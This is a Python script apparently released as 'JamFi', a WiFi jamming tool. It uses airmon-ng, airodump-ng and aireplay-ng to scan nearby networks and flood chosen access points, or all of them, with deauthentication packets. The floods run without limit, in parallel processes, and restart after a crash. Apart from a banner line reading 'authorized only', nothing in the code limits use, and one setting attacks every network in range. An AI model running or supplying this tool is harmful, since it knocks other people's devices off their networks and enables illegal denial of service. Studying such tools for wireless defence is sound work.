#!/usr/bin/env python3

# Import necessary modules
import sys
import os
import subprocess
import time
import signal as sig
import logging
import multiprocessing
from multiprocessing import Process
import csv
import configparser
from datetime import datetime
from typing import List, Tuple, Any

# Global flag to control stopping processes
stop_processes = multiprocessing.Event()

# Logging setup
logging.basicConfig(filename='wifi_jammer.log', level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')

# Signal handler to stop processes gracefully
def signal_handler(sig_num: int, frame: Any) -> None:
    logging.info("Stopping processes due to user interrupt...")
    stop_processes.set()

# Function to display the banner
def banner():
    ascii_art = r"""
╔════════════════════════════════════════════════╗
║   ▄████████  ▄█     ▄██████▄     ▄████████     ║
║  ███    ███ ███    ███    ███   ███    ███     ║
║  ███    █▀  ███▌   ███    ███   ███    █▀      ║
║ ▄███▄▄▄     ███▌   ███    ███  ▄███▄▄▄         ║
║▀▀███▀▀▀     ███▌ ▀███████████ ▀▀███▀▀▀         ║
║  ███    █▄  ███    ███    ███   ███    █▄      ║
║  ███    ███ ███    ███    ███   ███    ███     ║
║  ██████████ █▀     ███    █▀    ██████████     ║
╠════════════════════════════════════════════════╣
║       JamFi v1.0  — WiFi Deauth Toolkit              ║
║   ⚡  by @mrdineshpathro — authorized only ⚡   ║
╚════════════════════════════════════════════════╝
"""
    for line in ascii_art.splitlines():
        for char in line:
            sys.stdout.write(char)
            sys.stdout.flush()
            time.sleep(0.002)
        print()
    print()

# Function to check if the script is run as root
def check_root():
    if os.geteuid() != 0:
        logging.error("Run this script as root!")
        print("[!] Run this script as root!")
        exit(1)

# Function to list available wireless interfaces
def list_interfaces() -> List[str]:
    result = subprocess.run(['iwconfig'], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
    interfaces: List[str] = []
    for line in result.stdout.decode().split('\n'):
        if 'IEEE 802.11' in line:
            iface = line.split()[0]
            interfaces.append(iface)
    return interfaces

# Function to start monitor mode on a given interface
def start_monitor_mode(interface: str) -> str:
    logging.info(f"Starting monitor mode on {interface}...")
    print(f"[*] Starting monitor mode on {interface}...")
    subprocess.run(['airmon-ng', 'start', interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    return interface + "mon"

# Function to stop monitor mode on a given interface
def stop_monitor_mode(mon_iface: str) -> None:
    logging.info(f"Stopping monitor mode on {mon_iface}...")
    print(f"[*] Stopping monitor mode on {mon_iface}...")
    subprocess.run(['airmon-ng', 'stop', mon_iface], stdout=subprocess.DEVNULL)

# Function to scan for nearby WiFi networks
def scan_networks(mon_iface: str, duration: int = 10) -> List[Tuple[str, str, str, str]]:
    logging.info("Scanning for nearby WiFi networks...")
    print(f"[*] Scanning for nearby WiFi networks ({duration} seconds)...")
    proc = subprocess.Popen(['airodump-ng', mon_iface, '--write', 'scan_results', '--output-format', 'csv'],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(duration)
    proc.send_signal(sig.SIGINT)
    time.sleep(2)

    networks: List[Tuple[str, str, str, str]] = []
    try:
        with open('scan_results-01.csv', 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
            reading = False
            for line in lines:
                if line.strip() == '' and not reading:
                    reading = True
                    continue
                if reading:
                    fields = line.strip().split(',')
                    if len(fields) > 13:
                        bssid = fields[0].strip()
                        channel = fields[3].strip()
                        essid = fields[13].strip()
                        signal_strength = fields[8].strip()
                        if essid:
                            networks.append((bssid, channel, essid, signal_strength))
    except FileNotFoundError:
        logging.error("CSV scan results not found.")
        print("[!] CSV scan results not found.")
    return networks

# Function to display the detected WiFi networks
def display_networks(networks: List[Tuple[str, str, str, str]]) -> None:
    print("\nDetected WiFi Networks:")
    for i, net in enumerate(networks):
        print(f"[{i}] ESSID: {net[2]:20} BSSID: {net[0]}  Channel: {net[1]}  Signal: {net[3]} dBm")

# Function to perform a deauthentication attack on a given BSSID and channel
def deauth_attack(mon_iface: str, bssid: str, channel: str, packet_count: int = 0) -> None:
    logging.info(f"Starting Deauth Attack on BSSID: {bssid} (Channel {channel})...")
    print(f"\n[*] Deauth Attack -> BSSID: {bssid} | Channel: {channel}")
    subprocess.run(['iwconfig', mon_iface, 'channel', channel], stdout=subprocess.DEVNULL)
    try:
        subprocess.run(['aireplay-ng', '--deauth', str(packet_count), '-a', bssid, mon_iface])
    except KeyboardInterrupt:
        logging.warning("Attack interrupted by user.")
        print("[!] Attack interrupted by user.")

# Function to log deauthentication attempts to a CSV file
def log_deauth_attempt(bssid: str) -> None:
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open('deauth_log.csv', 'a', newline='') as f:
        writer = csv.writer(f)
        writer.writerow([timestamp, bssid, 'Broadcast'])

# Function to automatically resume the attack after a crash
def auto_resume_attack(mon_iface: str, bssid: str, channel: str, packet_count: int = 0, retry_delay: int = 5) -> None:
    while not stop_processes.is_set():
        try:
            deauth_attack(mon_iface, bssid, channel, packet_count)
        except Exception as e:
            logging.error(f"Attack crashed: {e}")
            print(f"[!] Attack crashed: {e}")
            print(f"[*] Resuming in {retry_delay} seconds...")
            time.sleep(retry_delay)

# Function to perform multi-threaded jamming of multiple networks
def multi_threaded_jamming(mon_iface: str, targets: List[Tuple[str, str]], packet_count: int = 0, retry_delay: int = 5) -> None:
    processes: List[Process] = []
    for bssid, channel in targets:
        p = Process(target=auto_resume_attack, args=(mon_iface, bssid, channel, packet_count, retry_delay))
        p.start()
        processes.append(p)
    try:
        for p in processes:
            p.join()
    except KeyboardInterrupt:
        stop_processes.set()
        for p in processes:
            p.terminate()
            p.join()

# Function to load configuration from a file
def load_config(config_file: str) -> configparser.ConfigParser:
    config = configparser.ConfigParser()
    config.read(config_file)
    return config

# Helper function to get boolean values from config
def get_config_bool(config: configparser.ConfigParser, section: str, option: str, fallback: bool = False) -> bool:
    # Helper function to get boolean values from config
    value = config.get(section, option, fallback=str(fallback)).lower()
    return value in ('true', 'yes', '1', 'on')

# Function to cleanup temporary files
def cleanup_temp_files() -> None:
    for file in os.listdir('.'):
        if file.startswith('scan_results-') and file.endswith('.csv'):
            os.remove(file)

# Main function
def main() -> None:
    # Register signal handler for graceful shutdown
    sig.signal(sig.SIGINT, signal_handler)

    # Load configuration
    config = load_config('config.ini')
    
    # Settings
    scan_duration = int(config.get('Settings', 'scan_duration', fallback='10'))
    deauth_packets = int(config.get('Settings', 'deauth_packets', fallback='0'))
    retry_delay = int(config.get('Settings', 'retry_delay', fallback='5'))
    auto_select_all = get_config_bool(config, 'Settings', 'auto_select_all', False)
    log_attacks = get_config_bool(config, 'Settings', 'log_attacks', True)
    
    # Advanced settings
    cleanup_files = get_config_bool(config, 'Advanced', 'cleanup_temp_files', True)
    show_banner = get_config_bool(config, 'Advanced', 'show_banner', True)
    
    # Display banner if enabled
    if show_banner:
        banner()
        
    # Check if the script is run as root
    check_root()

    # List available wireless interfaces
    interfaces = list_interfaces()
    if not interfaces:
        logging.error("No wireless interface found.")
        print("[!] No wireless interface found.")
        return

    # Select wireless interface
    if len(interfaces) == 1:
        iface = interfaces[0]
        print(f"[*] Auto-selected interface: {iface}")
    else:
        print("Available wireless interfaces:")
        for idx, iface in enumerate(interfaces):
            print(f"[{idx}] {iface}")
        try:
            choice = int(input("Select interface index: "))
            iface = interfaces[choice]
        except (ValueError, IndexError):
            logging.error("Invalid interface selection.")
            print("[!] Invalid interface selection.")
            return

    # Start monitor mode on the selected interface
    mon_iface = start_monitor_mode(iface)

    try:
        # Scan for nearby WiFi networks
        networks = scan_networks(mon_iface, scan_duration)
        if cleanup_files:
            cleanup_temp_files()
        if not networks:
            logging.error("No networks found.")
            print("[!] No networks found.")
            return
        display_networks(networks)

        # Allow selecting multiple networks
        selection = ""
        if auto_select_all:
            selection = "all"
            print("[*] Auto-selecting all networks based on configuration")
        else:
            print("\n[*] Enter network indices to attack (comma-separated, e.g., 0,1,3)")
            print("[*] Or enter 'all' to target all networks")
            selection = input("Select target networks: ").strip()
        
        targets: List[Tuple[str, str]] = []
        if selection.lower() == 'all':
            targets = [(net[0], net[1]) for net in networks]
            print(f"[*] Targeting all {len(networks)} networks")
            logging.info(f"Targeting all {len(networks)} networks")
        else:
            try:
                indices = [int(idx.strip()) for idx in selection.split(',')]
                for idx in indices:
                    if 0 <= idx < len(networks):
                        bssid, channel, essid, signal_strength = networks[idx]
                        targets.append((bssid, channel))
                        print(f"[*] Target: {essid} | BSSID: {bssid} | Channel: {channel} | Signal: {signal_strength} dBm")
                        logging.info(f"Targeting {essid} | BSSID: {bssid} | Ch: {channel} | Signal: {signal_strength}")
                        if log_attacks:
                            log_deauth_attempt(bssid)
            except ValueError:
                logging.error("Invalid network selection.")
                print("[!] Invalid network selection.")
                return
        
        if not targets:
            logging.error("No valid targets selected.")
            print("[!] No valid targets selected.")
            return
            
        print(f"\n[*] Starting attacks on {len(targets)} networks...")
        print(f"[*] Deauth packet count: {deauth_packets} | Retry delay: {retry_delay}s")
        multi_threaded_jamming(mon_iface, targets, deauth_packets, retry_delay)

    finally:
        # Stop monitor mode and cleanup temporary files
        stop_monitor_mode(mon_iface)
        if cleanup_files:
            cleanup_temp_files()
        logging.info("Cleanup complete.")
        print("[*] Cleanup complete.")

# Entry point of the script
if __name__ == '__main__':
    main()
